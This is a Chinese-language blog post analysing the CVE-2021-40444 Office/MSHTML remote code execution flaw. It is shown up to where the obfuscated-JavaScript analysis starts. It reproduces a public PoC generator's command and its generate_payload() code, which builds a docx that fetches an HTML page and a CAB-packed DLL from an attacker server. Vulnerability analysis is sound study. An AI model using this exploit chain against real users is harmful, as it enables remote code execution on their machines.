

# [原创]详细分析 CVE-2021-40444 远程命令执行漏洞

## 1. 前言

按照顺序，本来计划要看的应该是《漏洞战争》中的 Adobe Reader UAF 漏洞，最近一直在看的 Adobe 产品的漏洞……所以决定转换一下思路，挑了最近新出现的 CVE-2021-40444 漏洞。刚好<a href="elink@8d8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5i4m8W2M7W2)9J5k6i4y4W2k6h3u0#2k6#2)9J5k6h3!0J5k6#2)9J5c8U0p5%4x3e0R3`.">404 之前有一篇博客写过这个漏洞</a>，我在它的参考资料里面找到了 GitHub 上面提供的<a href="elink@c6fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6D9L8$3y4C8k6h3c8T1P5i4c8W2i4K6u0r3b7#2k6q4i4K6u0V1x3U0l9J5x3g2)9J5k6o6b7H3y4o6b7@1i4K6u0r3N6s2u0W2k6g2)9J5c8U0M7I4x3$3c8X3k6X3y4U0z5e0M7@1k6e0S2X3j5K6S2T1k6U0u0W2k6r3b7I4k6o6q4V1k6o6g2X3y4h3k6W2x3U0l9^5k6e0q4S2y4$3j5`.">PoC 生成代码</a>，以及 j00sean 在 Twitter 上面发的 6 行代码，以这两者为基础对该漏洞进行分析。

## 2. PoC 静态分析

先看 GitHub 上面的项目，根据 README 中的信息，用于生成 PoC 的主体代码文件是 `exploit.py`，生成命令为：

```bash
python3 <a href="elink@0e6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2^5M7r3I4G2K9i4c8Q4x3X3g2H3P5g2)9J5c8R3`.`.">exploit.py</a> generate test/calc.dll http://<SRV IP>
```

那么我们先来看一下 `exploit.py` 这个文件。

### 2.1 PoC 生成代码

观察 `exploit.py`，用于生成 PoC 的主体函数是 `generate_payload()`，主要功能代码如下（删除了一些不影响理解的代码）：

```python
def generate_payload():
    # 1. 将 payload 内容写入 word.dll
    payload_content = open(payload_path, 'rb').read()
    filep = open('data/word.dll', 'wb')
    filep.write(payload_content)

    # 2. 将服务器地址写入要生成的 doc 文档中
    execute_cmd('cp -r data/word_dat/ data/tmp_doc/')
    rels_pr = open('data/tmp_doc/word/_rels/document.xml.rels', 'r')
    xml_content = rels_pr.read()
    xml_content = xml_content.replace(
        '<EXPLOIT_HOST_HERE>',
        srv_url + '/word.html'
    )
    rels_pw = open('data/tmp_doc/word/_rels/document.xml.rels', 'w')
    rels_pw.write(xml_content)

    # 3. 生成 doc 文档
    os.system('zip -r document.docx *')
    execute_cmd('cp document.docx ../../out/document.docx')

    # 4. 生成 cab 文件
    execute_cmd('cp word.dll msword.inf')
    execute_cmd("lcab '../msword.inf' out.cab")
    patch_cab('out.cab')
    execute_cmd('cp out.cab ../../srv/word.cab')

    # 5. 替换 HTML 文件中的 cab 文件路径
    execute_cmd('cp backup.html word.html')
    p_exp = open('word.html', 'r')
    exploit_content = p_exp.read()
    exploit_content = exploit_content.replace(
        '<HOST_CHANGE_HERE>',
        srv_url + '/word.cab'
    )
    p_exp = open('word.html', 'w')
    p_exp.write(exploit_content)
    return
```

注意到在第二步中，代码对 doc 文档中的 `word/_rels/document.xml.rels` 文件进行了更新，添加了 `srv_url + '/word.html'`，这样在文档打开的时候，就会尝试连接服务器地址并打开 `word.html` 文件。

在第五步中，代码对 doc 文档会打开的 `word.html` 文件进行了更新，添加了 `word.cab` 的连接路径。

而 `word.cab` 文件又是从命令行中指定的 payload `test/calc.dll`，使用 `lcab` 工具生成的 CAB 文件。

所以接下来我们要看一下 `word.html` 和 `word.cab` 文件又做了些什么。

### 2.2 HTML 文件

*注：我也是自己反混淆完之后才发现 lockedbyte 的 GitHub 项目里面有 `deobfuscate.py` 文件和 `deob.html` 文件，/(ㄒoㄒ)/~~*

`word.html` 中包含一段混淆后的 JavaScript 代码，首先使用 Notepad++ 中的插件进行一下美化：

